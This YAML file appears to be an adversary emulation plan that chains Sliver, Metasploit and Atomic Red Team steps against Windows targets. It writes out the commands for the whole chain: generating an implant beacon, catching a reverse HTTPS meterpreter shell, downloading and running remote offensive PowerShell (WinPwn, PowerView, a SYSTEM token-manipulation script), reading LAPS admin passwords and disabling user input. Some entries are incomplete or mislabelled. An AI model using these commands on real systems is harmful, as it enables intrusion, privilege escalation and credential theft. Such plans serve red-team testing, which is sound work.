  - emulation_plan_details:
      adversary_name: test
      creation_time: 2025-01-08 18:06:35 UTC+0000
  - uuid: 972f9f15-94e5-4b3f-a97a-053d1f8f7a98
    name: Sliver Windows Implant Generation
    id: T1071.004
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique:
      - 'Application Layer Protocol: Encrypted Channel'
    description: |
      Sliver generates implant for Windows platform and enables mtls monitoring.
    executor:
      command: |
        sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
        sliver > mtls
    arguments:
      attacker_ip:
        default:
        description: IP address of the attacker machine
        type:
      target_platform:
        default: windows
        description: The operating system type of the victim machine
        type:
    preconditions: []
    effects:
      - (prepared_sliver_implant)
  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
    name:
    id:
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
    description:
    executor:
      command: |
        Manually download the sliver implant and execute it on the victim's machine
        sliver > sessions -i session_id //interact with a session
    arguments:
    preconditions:
      - (prepared_sliver_implant)
    effects:
      - (sliver_session)
  - uuid: 416abcb2-2207-48e8-93c1-3010f2d8b817
    name: Directory Disclosure
    id: T1083
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique: File and Directory Discovery
    description: 'The `pwd` command in a Sliver session prints the current working
      directory of the active session. It provides information about the directory
      in which the session is currently operating. The command includes optional flags:
      `-h` or `--help` to display help information, and `-t` or `--timeout` to set
      a command timeout in seconds, with a default of 60 seconds.'
    executor: |-
      Executed in a Sliver session:
      Command: pwd
      About: Print working directory of the active session. 
                                                                                                                                                                                                                                                                                                                                                                                        Usage:
      ======
      pwd [flags]

      Flags:
      ======                                                                                                                                                                                                                
      -h, --help           display help
      -t, --timeout int    command timeout in seconds (default: 60)
    preconditions:
      - (sliver_session)
    effects:
      - (CAP_directory_disclosure ?e - executable)
  - uuid: 08f66886-0e96-455b-be31-b0af37db8e23
    name: Build meterpreter session using Sliver
    id: T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
      - Command and Control
    technique:
      - Windows Command Shell
      - Ingress Tool Transfer
      - Non-Standard Por
    description: |
      Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back, 
      so that msf establishes a shell connection with the target host.
    executor:
      command: |
        # msfconsole
        msf6 > use exploit/multi/handler
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
        msf6 exploit(multi/handler) > set lport 9091
        msf6 exploit(multi/handler) > set lhost 192.168.130.128
        msf6 exploit(multi/handler) > exploit -j -z

        sliver (BOLD_MUSCULATURE) > msf --lhost 192.168.130.128 -l 9091

        msf6 exploit(multi/handler) > sessions 1
    arguments:
      attacker_ip:
        default:
        description: IP address of the attacker machine
        type:
      attacker_port:
        default:
        description: listening port of the attacter machine
        type:
      payload_type:
        default: windows/x64/meterpreter_reverse_https
        description: payload type set by msf
        type:
    preconditions:
      - (sliver_session)
    effects:
      - (meterpreter_session ?s - session)
  - uuid: ed8ec352-d763-411b-b825-34cc0138a911
    name: Process Enumeration
    id: T1057
    source: Sliver
    supported_platforms:
      - windows
      - linux
      - macos
    tactics:
      - Discovery
    technique: Process Discovery
    description: The command `ps` in a Sliver session is used to list processes running
      on a remote system. It offers various flags to filter and format the output,
      such as filtering by executable name, owner, or process ID, displaying command
      line arguments, and printing the process tree. It also allows setting a command
      timeout and skipping pages of output. The `--overflow` flag helps manage terminal
      width by displaying truncated rows.
    executor: |-
      Executed in a Sliver session:
      Command: ps <options>
      About: List processes on remote system.

      Usage:
      ======
      ps [flags]

      Flags:
      ======
      -e, --exe           string    filter based on executable name
      -h, --help                    display help
      -O, --overflow                overflow terminal width (display truncated rows)
      -o, --owner         string    filter based on owner
      -p, --pid           int       filter based on pid (default: -1)
      -c, --print-cmdline           print command line arguments
      -S, --skip-pages    int       skip the first n page(s) (default: 0)
      -t, --timeout       int       command timeout in seconds (default: 60)
      -T, --tree                    print process tree
    preconditions:
      - (sliver_session)
    effects:
      - (process_enumeration ?p - process)
  - uuid: 8315686c-035b-415e-9069-2e14799421e5
    name: Interactive Shell Access via Sliver
    id: T1059
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique: Command and Scripting Interpreter
    description: In the context of the Sliver framework, the command `shell` is used
      to open an interactive shell on the compromised machine associated with the
      active session.
    executor:
      command: |
        sliver (SESSION_NAME) > shell
    arguments:
    preconditions:
      - (sliver_session)
    effects:
      - (CAP_powershell_access ?e - executable)
  - uuid: cf6f614c-83c9-4018-911b-c432bb95acfd
    name: User Context Verification via Sliver
    id: T1033
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique:
      - System Owner/User Discovery
    description: |
      Simply collect various information of the target machine, including network information, 
      user information, etc..
    executor:
      command: |
        sliver (BOLD_MUSCULATURE) > whoami
    arguments:
    preconditions:
      - (sliver_session)
    effects:
      - (target_information_collected)
  - uuid: cb6e76ca-861e-4a7f-be08-564caa3e6f75
    name: WinPwn - printercheck
    id: T1120
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: Peripheral Device Discovery
    description: Search for printers / potential vulns using printercheck function
      of WinPwn
    executor:
      command: |-
        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        printercheck -noninteractive -consoleoutput
      name: powershell
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (vulnerable_printer ?p - printer)
  - uuid: 02e8be5a-3065-4e54-8cc8-a14d138834d3
    name: Enumerate Active Directory Users with ADSISearcher
    id: T1087.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: 'Account Discovery: Domain Account'
    description: |
      The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.
      Upon successful execution a listing of users will output with their paths in AD.
      Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
    executor:
      name: powershell
      elevation_required: false
      command: |
        ([adsisearcher]"objectcategory=user").FindAll(); ([adsisearcher]"objectcategory=user").FindOne()
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (enumerate_active_directory ?e - executable)
  - uuid: 58ed10e8-0738-4651-8408-3a3e9a526279
    name: Get-ForestTrust with PowerView
    id: T1482
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: Domain Trust Discovery
    description: |
      Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.
    executor:
      command: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
      name: powershell
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (identifies_domain_forest_trusts)
  - uuid: 6e85bdf9-7bc4-4259-ac0f-f0cb39964443
    name: Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property
    id: T1087.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: 'Account Discovery: Domain Account'
    description: This test executes LDAP query using powershell command Get-ADComputer
      and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime
    executor:
      command: 'Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime'
      cleanup_command:
      name: powershell
      elevation_required: false
    arguments:
      hostname:
        description: Name of the host
        type: string
        default: $env:computername
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (exposes_local_admin_password ?e - executable)
  - uuid: 69119e58-96db-4110-ad27-954e48f3bb13
    name: WMIObject Group Discovery
    id: T1069.001
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: 'Permission Groups Discovery: Local Groups'
    description: |
      Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.
    executor:
      command: |
        Get-WMIObject Win32_Group
      name: powershell
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (enumerate_local_groups ?s - system)
  - uuid: 8b8a6449-be98-4f42-afd2-dedddc7453b2
    name: Enumerate all accounts via PowerShell (Domain)
    id: T1087.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Discovery
    technique: 'Account Discovery: Domain Account'
    description: |
      Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.
    executor:
      command: |
        net user /domain
        get-localgroupmember -group Users
        get-aduser -filter *
      name: powershell
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (NULL ?parameters)
  - uuid: ccf4ac39-ec93-42be-9035-90e2f26bcd92
    name: WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique
    id: T1134.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Defense Evasion
      - Privilege Escalation
    technique: 'Access Token Manipulation: Create Process with Token'
    description: Get SYSTEM shell - Pop System Shell using Token Manipulation technique
      via function of WinPwn
    executor:
      command: iex(new-object 
        net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
      name: powershell
    arguments: []
    dependencies: []
    preconditions:
      - (powershell)
    effects:
      - (privilege_escalation ?u - user)
  - uuid: 625110c4-6f30-4e19-8b22-013d4c8a8d8b
    name: UI Control Manipulation
    id: T1082
    source: Meterpreter
    supported_platforms:
      - linux
      - windows
      - macos
    tactics:
      - Discovery
    technique: System Information Discovery
    description: The command `uictl` is used within a Meterpreter session to control
      user interface components on a compromised system. It allows the user to enable
      or disable input from the keyboard, mouse, or both. This can be used to manipulate
      or restrict the target system's user interface interactions, potentially for
      maintaining stealth or preventing user interference during an operation.
    executor: |-
      Executed in a metrepreter session:
      Usage: uictl [enable/disable] [keyboard/mouse/all]
      Control some of the user interface components
    preconditions:
      - (meterpreter_session ?s - session)
      - (privilege_escalation ?u - user)
    effects:
      - (disable_input ?d - device)
